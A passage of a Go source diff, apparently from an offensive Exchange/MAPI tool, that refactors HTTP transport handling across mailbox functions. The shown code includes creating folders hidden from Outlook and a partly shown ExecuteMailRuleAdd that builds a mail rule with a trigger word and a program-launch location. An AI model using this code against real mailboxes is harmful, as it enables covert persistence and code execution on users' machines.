-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+			return nil, err
 		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+		bufPtr += p
+		deleteMessageResponse := RopDeleteMessagesResponse{}
 
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-			openFolder := RopOpenFolderResponse{}
-			p, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			bufPtr += p
-			deleteMessageResponse := RopDeleteMessagesResponse{}
-
-			_, e := deleteMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-
-			return &deleteMessageResponse, nil
+		_, e := deleteMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
 		}
 
+		return &deleteMessageResponse, nil
 	}
 
 	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
@@ -691,27 +694,26 @@ func GetFolder(folderid int, columns []PropertyTag) (*RopOpenFolderResponse, err
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-			openFolder := RopOpenFolderResponse{}
-			_, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			//this should be the handle to the folder
-			//fmt.Println(execResponse.RopBuffer[len(execResponse.RopBuffer)-4:])
-			return &openFolder, nil
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+		openFolder := RopOpenFolderResponse{}
+		_, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
+		}
+		//this should be the handle to the folder
+		//fmt.Println(execResponse.RopBuffer[len(execResponse.RopBuffer)-4:])
+		return &openFolder, nil
+	}
+
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -754,52 +756,51 @@ func GetMessage(folderid, messageid []byte, columns []PropertyTag) (*RopGetPrope
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			if execResponse.RopBuffer[2] == 0x05 { //compression
-				//decompress
-			}
-			bufPtr := 10
-
-			if execResponse.RopBuffer[bufPtr : bufPtr+1][0] != 0x03 {
-				bufPtr += 4
-			}
-
-			openMessage := RopOpenMessageResponse{}
-			p, err := openMessage.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			bufPtr += p
-
-			props := RopGetPropertiesSpecificResponse{}
-			_, err = props.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
-			if err != nil {
-				return nil, err
-			}
-			//bufPtr += p
-			return &props, nil
-			/*
-				fmt.Println(execResponse.RopBuffer[bufPtr:])
-				rows := RopQueryRowsResponse{}
-
-				_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
-				if err != nil {
-					return nil, err
-				}
-				fmt.Println(rows)
-				return &rows, nil
-			*/
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		if execResponse.RopBuffer[2] == 0x05 { //compression
+			//decompress
+		}
+		bufPtr := 10
+
+		if execResponse.RopBuffer[bufPtr : bufPtr+1][0] != 0x03 {
+			bufPtr += 4
+		}
+
+		openMessage := RopOpenMessageResponse{}
+		p, err := openMessage.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
+		}
+		bufPtr += p
+
+		props := RopGetPropertiesSpecificResponse{}
+		_, err = props.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
+		if err != nil {
+			return nil, err
+		}
+		//bufPtr += p
+		return &props, nil
+		/*
+			fmt.Println(execResponse.RopBuffer[bufPtr:])
+			rows := RopQueryRowsResponse{}
+
+			_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
+			if err != nil {
+				return nil, err
+			}
+			fmt.Println(rows)
+			return &rows, nil
+		*/
+	}
+
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -846,73 +847,72 @@ func GetMessageFast(folderid, messageid []byte, columns []PropertyTag) (*RopFast
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
+
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		if execResponse.RopBuffer[2] == 0x05 { //compression
+			//decompress
+		}
+		bufPtr := 10
+
+		if execResponse.RopBuffer[bufPtr : bufPtr+1][0] != 0x03 {
+			bufPtr += 4
+		}
+
+		openMessage := RopOpenMessageResponse{}
+		p, err := openMessage.Unmarshal(execResponse.RopBuffer[bufPtr:])
 		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+			return nil, err
 		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+		bufPtr += p
 
-		if execResponse.ErrorCode == 0 {
-			if execResponse.RopBuffer[2] == 0x05 { //compression
-				//decompress
-			}
-			bufPtr := 10
-
-			if execResponse.RopBuffer[bufPtr : bufPtr+1][0] != 0x03 {
-				bufPtr += 4
-			}
-
-			openMessage := RopOpenMessageResponse{}
-			p, err := openMessage.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			bufPtr += p
-
-			props := RopFastTransferSourceCopyPropertiesResponse{}
-			p, err = props.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			bufPtr += p
-			//fmt.Printf("%x\n", execResponse.RopBuffer[bufPtr:])
-			pprops := RopFastTransferSourceGetBufferResponse{}
-			p, err = pprops.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			fmt.Println("TransferStatus: ", pprops.TransferStatus) //0x0000 -- error 0x0001 -- partial
-			fmt.Println("TotalStepCount: ", pprops.TotalStepCount)
-			fmt.Println("InProgressCount: ", pprops.InProgressCount)
-
-			if pprops.TransferStatus == 0x0001 {
-				buff, _ := FastTransferFetchStep(execResponse.RopBuffer[bufPtr+p:])
-				//fmt.Println(string(buff), err)
-				if buff != nil {
-					pprops.TransferBuffer = append(pprops.TransferBuffer, buff...)
-					//fmt.Printf("%s\n", pprops.TransferBuffer)
-				}
-			}
-			ReleaseObject(0x01)
-
-			//Rop release if we are done.. otherwise get rest of stream
-
-			return &pprops, nil
-			/*
-				fmt.Println(execResponse.RopBuffer[bufPtr:])
-				rows := RopQueryRowsResponse{}
-
-				_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
-				if err != nil {
-					return nil, err
-				}
-				fmt.Println(rows)
-				return &rows, nil
-			*/
+		props := RopFastTransferSourceCopyPropertiesResponse{}
+		p, err = props.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
 		}
+		bufPtr += p
+		//fmt.Printf("%x\n", execResponse.RopBuffer[bufPtr:])
+		pprops := RopFastTransferSourceGetBufferResponse{}
+		p, err = pprops.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
+		}
+		fmt.Println("TransferStatus: ", pprops.TransferStatus) //0x0000 -- error 0x0001 -- partial
+		fmt.Println("TotalStepCount: ", pprops.TotalStepCount)
+		fmt.Println("InProgressCount: ", pprops.InProgressCount)
+
+		if pprops.TransferStatus == 0x0001 {
+			buff, _ := FastTransferFetchStep(execResponse.RopBuffer[bufPtr+p:])
+			//fmt.Println(string(buff), err)
+			if buff != nil {
+				pprops.TransferBuffer = append(pprops.TransferBuffer, buff...)
+				//fmt.Printf("%s\n", pprops.TransferBuffer)
+			}
+		}
+		ReleaseObject(0x01)
+
+		//Rop release if we are done.. otherwise get rest of stream
+
+		return &pprops, nil
+		/*
+			fmt.Println(execResponse.RopBuffer[bufPtr:])
+			rows := RopQueryRowsResponse{}
+
+			_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
+			if err != nil {
+				return nil, err
+			}
+			fmt.Println(rows)
+			return &rows, nil
+		*/
+
 	}
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
@@ -932,46 +932,45 @@ func FastTransferFetchStep(handles []byte) ([]byte, error) {
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = append([]byte{0x00, 0x00, 0x00, AuthSession.LogonID}, handles...) //append(handles, []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}...) //[]byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF} //append([]byte{0x00, 0x00, 0x00, AuthSession.LogonID}, handles...)
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			if execResponse.RopBuffer[2] == 0x05 { //compression
-				//decompress
-			}
-			bufPtr := 10
-
-			//fmt.Printf("%x\n", execResponse.RopBuffer[:])
-			pprops := RopFastTransferSourceGetBufferResponse{}
-			p, err := pprops.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			fmt.Println("TransferStatus: ", pprops.TransferStatus) //0x0000 -- error 0x0001 -- partial
-			fmt.Println("TotalStepCount: ", pprops.TotalStepCount)
-			fmt.Println("InProgressCount: ", pprops.InProgressCount)
-
-			//Rop release if we are done.. otherwise get rest of stream
-			//fmt.Printf("%x\n", pprops.TransferBuffer)
-
-			if pprops.TransferStatus == 0x0001 {
-				buff, _ := FastTransferFetchStep(execResponse.RopBuffer[bufPtr+p:])
-				//fmt.Println(string(buff), err)
-				if buff != nil {
-					pprops.TransferBuffer = append(pprops.TransferBuffer, buff...)
-
-				}
-			}
-
-			return pprops.TransferBuffer, nil
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		if execResponse.RopBuffer[2] == 0x05 { //compression
+			//decompress
+		}
+		bufPtr := 10
+
+		//fmt.Printf("%x\n", execResponse.RopBuffer[:])
+		pprops := RopFastTransferSourceGetBufferResponse{}
+		p, err := pprops.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
+		}
+		fmt.Println("TransferStatus: ", pprops.TransferStatus) //0x0000 -- error 0x0001 -- partial
+		fmt.Println("TotalStepCount: ", pprops.TotalStepCount)
+		fmt.Println("InProgressCount: ", pprops.InProgressCount)
+
+		//Rop release if we are done.. otherwise get rest of stream
+		//fmt.Printf("%x\n", pprops.TransferBuffer)
+
+		if pprops.TransferStatus == 0x0001 {
+			buff, _ := FastTransferFetchStep(execResponse.RopBuffer[bufPtr+p:])
+			//fmt.Println(string(buff), err)
+			if buff != nil {
+				pprops.TransferBuffer = append(pprops.TransferBuffer, buff...)
+
+			}
+		}
+
+		return pprops.TransferBuffer, nil
+	}
+
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -999,36 +998,34 @@ func GetContentsTable(folderid []byte) (*RopGetContentsTableResponse, []byte, er
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch contents
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
-
-		if execResponse.StatusCode == 0 {
-			bufPtr := 10
-
-			openFolder := RopOpenFolderResponse{}
-			p, er := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if er != nil {
-				return nil, nil, err
-			}
-			bufPtr += p
-
-			ropContents := RopGetContentsTableResponse{}
-			p, er = ropContents.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if er != nil {
-				return nil, nil, err
-			}
-			bufPtr += p + 8
-			return &ropContents, execResponse.RopBuffer[bufPtr:], nil
-		}
-
+	if err != nil {
+		return nil, nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.StatusCode == 0 {
+		bufPtr := 10
+
+		openFolder := RopOpenFolderResponse{}
+		p, er := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if er != nil {
+			return nil, nil, err
+		}
+		bufPtr += p
+
+		ropContents := RopGetContentsTableResponse{}
+		p, er = ropContents.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if er != nil {
+			return nil, nil, err
+		}
+		bufPtr += p + 8
+		return &ropContents, execResponse.RopBuffer[bufPtr:], nil
+	}
+
 	return nil, nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -1055,34 +1052,33 @@ func GetFolderHierarchy(folderid []byte) (*RopGetHierarchyTableResponse, []byte,
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
+
+	if err != nil {
+		return nil, nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+		openFolder := RopOpenFolderResponse{}
+		p, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
 		if err != nil {
-			return nil, nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+			return nil, nil, err
 		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+		bufPtr += p
 
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-			openFolder := RopOpenFolderResponse{}
-			p, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, nil, err
-			}
-			bufPtr += p
-
-			hierarchyTableResponse := RopGetHierarchyTableResponse{}
-			p, err = hierarchyTableResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, nil, err
-			}
-
-			bufPtr += p + 8 //the serverhandle is the 3rd set of 4 bytes - we need this handle to access the hierarchy table
-
-			return &hierarchyTableResponse, execResponse.RopBuffer[bufPtr:], nil
+		hierarchyTableResponse := RopGetHierarchyTableResponse{}
+		p, err = hierarchyTableResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, nil, err
 		}
+
+		bufPtr += p + 8 //the serverhandle is the 3rd set of 4 bytes - we need this handle to access the hierarchy table
+
+		return &hierarchyTableResponse, execResponse.RopBuffer[bufPtr:], nil
+
 	}
 	return nil, nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
@@ -1111,34 +1107,33 @@ func GetSubFolders(folderid []byte) (*RopQueryRowsResponse, error) {
 	execRequest.RopBuffer.ROP.RopsList = fullReq
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = append([]byte{0x01, 0x00, 0x00, AuthSession.LogonID}, svrhndl...)
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-
-			setColumnsResp := RopSetColumnsResponse{}
-			p, err := setColumnsResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			bufPtr += p
-
-			rows := RopQueryRowsResponse{}
-
-			_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], setColumns.PropertyTags)
-			if err != nil {
-				return nil, err
-			}
-			return &rows, nil
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+
+		setColumnsResp := RopSetColumnsResponse{}
+		p, err := setColumnsResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
+		}
+		bufPtr += p
+
+		rows := RopQueryRowsResponse{}
+
+		_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], setColumns.PropertyTags)
+		if err != nil {
+			return nil, err
+		}
+		return &rows, nil
+	}
+
 	return nil, fmt.Errorf("[x] An unexpected error occurred")
 }
 
@@ -1152,8 +1147,8 @@ func CreateFolder(folderName string, hidden bool) (*RopCreateFolderResponse, err
 	createFolder.FolderType = 0x01
 	createFolder.UseUnicodeStrings = 0x01
 	createFolder.OpenExisting = 0x00
-	createFolder.DisplayName = UniString(folderName)
-	createFolder.Comment = UniString("some comment")
+	createFolder.DisplayName = utils.UniString(folderName)
+	createFolder.Comment = utils.UniString("some comment")
 	fullReq := createFolder.Marshal()
 
 	//if we want to create a hidden folder (so it doesn't show up in Outlook)
@@ -1168,7 +1163,7 @@ func CreateFolder(folderName string, hidden bool) (*RopCreateFolderResponse, err
 		setProperties.PropertyValues = propertyTags
 		propertySize := 0
 		for _, p := range propertyTags {
-			propertySize += len(BodyToBytes(p))
+			propertySize += len(utils.BodyToBytes(p))
 		}
 
 		setProperties.PropertValueSize = uint16(propertySize + 2)
@@ -1179,35 +1174,33 @@ func CreateFolder(folderName string, hidden bool) (*RopCreateFolderResponse, err
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-			createFolder := RopCreateFolderResponse{}
-			_, err = createFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				fmt.Println(err)
-				return nil, err
-			}
-			if hidden == true {
-				propResp := RopSetPropertiesResponse{}
-				_, er := propResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
-				if er != nil {
-					return nil, er
-				}
-			}
-
-			return &createFolder, nil
-		}
-
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+		createFolder := RopCreateFolderResponse{}
+		_, err = createFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			fmt.Println(err)
+			return nil, err
+		}
+		if hidden == true {
+			propResp := RopSetPropertiesResponse{}
+			_, er := propResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
+			if er != nil {
+				return nil, er
+			}
+		}
+
+		return &createFolder, nil
+	}
+
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -1240,38 +1233,37 @@ func GetContents(folderid []byte) (*RopQueryRowsResponse, error) {
 	execRequest.RopBuffer.ROP.RopsList = fullReq
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = append([]byte{0x01, 0x00, 0x00, AuthSession.LogonID}, svrhndl...)
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-			if execResponse.RopBuffer[2] == 0x05 { //compression
-				//decompress
-				//Decompress(execResponse.RopBuffer[6:])
-			}
-
-			setColumnsResp := RopSetColumnsResponse{}
-			p, err := setColumnsResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, err
-			}
-			bufPtr += p
-
-			rows := RopQueryRowsResponse{}
-
-			_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], setColumns.PropertyTags)
-			if err != nil {
-				return nil, err
-			}
-			return &rows, nil
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+		if execResponse.RopBuffer[2] == 0x05 { //compression
+			//decompress
+			//Decompress(execResponse.RopBuffer[6:])
+		}
+
+		setColumnsResp := RopSetColumnsResponse{}
+		p, err := setColumnsResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if err != nil {
+			return nil, err
+		}
+		bufPtr += p
+
+		rows := RopQueryRowsResponse{}
+
+		_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], setColumns.PropertyTags)
+		if err != nil {
+			return nil, err
+		}
+		return &rows, nil
+	}
+
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -1300,23 +1292,21 @@ func DisplayRules() ([]Rule, error) {
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
 
 	//fetch folder
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		rules, _ := DecodeRulesResponse(execResponse.RopBuffer, setColumns.PropertyTags)
-		if rules == nil {
-			return nil, fmt.Errorf("[x] Error retrieving rules")
-		}
-		return rules, nil
-
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
-	return nil, fmt.Errorf("[x] An Unspecified error occurred")
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	rules, _ := DecodeRulesResponse(execResponse.RopBuffer, setColumns.PropertyTags)
+	if rules == nil {
+		return nil, fmt.Errorf("[x] Error retrieving rules")
+	}
+	return rules, nil
+
+	//return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
 //ExecuteMailRuleAdd adds a new mailrules
@@ -1334,32 +1324,32 @@ func ExecuteMailRuleAdd(rulename, triggerword, triggerlocation string, delete bo
 
 	propertyValues := make([]TaggedPropertyValue, 8)
 	//RUle Name
-	propertyValues[0] = TaggedPropertyValue{PidTagRuleName, UniString(rulename)}
+	propertyValues[0] = TaggedPropertyValue{PidTagRuleName, utils.UniString(rulename)}
 	//PidTagRuleSequence
 	propertyValues[1] = TaggedPropertyValue{PidTagRuleSequence, []byte{0x0A, 0x00, 0x00, 0x00}}
 	//PidTagRuleState (Enabled)
 	propertyValues[2] = TaggedPropertyValue{PidTagRuleState, []byte{0x01, 0x00, 0x00, 0x00}}
 	//PidTagRuleCondition
-	propertyValues[3] = TaggedPropertyValue{PidTagRuleCondition, BodyToBytes(RuleCondition{0x03, []byte{0x01, 0x00, 0x01, 0x00}, []byte{0x1F, 0x00, 0x37, 0x00, 0x1f, 0x00, 0x37, 0x00}, UniString(triggerword)})}
+	propertyValues[3] = TaggedPropertyValue{PidTagRuleCondition, utils.BodyToBytes(RuleCondition{0x03, []byte{0x01, 0x00, 0x01, 0x00}, []byte{0x1F, 0x00, 0x37, 0x00, 0x1f, 0x00, 0x37, 0x00}, utils.UniString(triggerword)})}
 	//PidTagRuleActions
 
 	actionData := ActionData{}
 	actionData.ActionElem = []byte{0x00, 0x00, 0x14}
-	actionData.ActionName = UTF16BE(rulename, 1)
+	actionData.ActionName = utils.UTF16BE(rulename, 1)
 	actionData.Element = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xa8, 0x00, 0x00, 0x00, delbit, 0x00, 0xff, 0xff, 0x00, 0x00, 0x0c, 0x00, 0x43, 0x52, 0x75, 0x6c, 0x65, 0x45, 0x6c, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x90, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0xcd, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
-	actionData.Triggger = UTF16BE(triggerword, 1)
+	actionData.Triggger = utils.UTF16BE(triggerword, 1)
 	actionData.Elem = []byte{0x80, 0x49, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
-	actionData.EndPoint = append(UTF16BE(triggerlocation, 1), []byte{0x80, 0x4a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x42, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
+	actionData.EndPoint = append(utils.UTF16BE(triggerlocation, 1), []byte{0x80, 0x4a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x42, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
 
 	ruleAction := RuleAction{Actions: 1, ActionType: 0x05, ActionFlavor: 0, ActionFlags: 0}
-	ruleAction.ActionLen = uint16(len(BodyToBytes(actionData)) + 9)
+	ruleAction.ActionLen = uint16(len(utils.BodyToBytes(actionData)) + 9)
 	ruleAction.ActionData = actionData
 
 	pdat := ruleAction.Marshal()
 
